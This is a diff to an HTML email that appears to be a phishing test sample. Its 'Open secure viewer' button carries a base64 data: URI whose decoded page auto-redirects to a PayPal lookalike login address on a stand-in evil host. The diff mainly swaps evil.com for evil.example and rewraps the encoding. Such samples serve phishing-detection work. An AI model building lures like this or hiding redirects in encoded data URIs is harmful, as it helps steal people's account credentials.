@@ -23,7 +23,9 @@ MIME-Version: 1.0
 </head>
 <body>
   <div class=3D"card">
-    <h1>Encrypted message</h1><p>Open the protected viewer.</p><a class=3D"button" href=3D"data:text/html;base64,PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9aHR0cHM6Ly9wYXlwYWwuY29tLmV2aWwuY29tL2RhdGEvbG9naW4iPjwvaGVhZD48Ym9keT5Mb2FkaW5nIHNlY3VyZSBzaWduLWluLi4uPC9ib2R5PjwvaHRtbD4=3D">Open secure viewer</a><p class=3D"muted">Reference: https://paypal.com.evil.example/data/login</p>
+    <h1>Encrypted message</h1><p>Open the protected viewer.</p><a class=3D"button" href=3D"data:text/html;base64,PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9aHR0
+cHM6Ly9wYXlwYWwuY29tLmV2aWwuZXhhbXBsZS9kYXRhL2xvZ2luIj48L2hlYWQ+PGJvZHk+TG9h
+ZGluZyBzZWN1cmUgc2lnbi1pbi4uLjwvYm9keT48L2h0bWw+">Open secure viewer</a><p class=3D"muted">Reference: https://paypal.com.evil.example/data/login</p>
   </div>
 </body>
 </html>
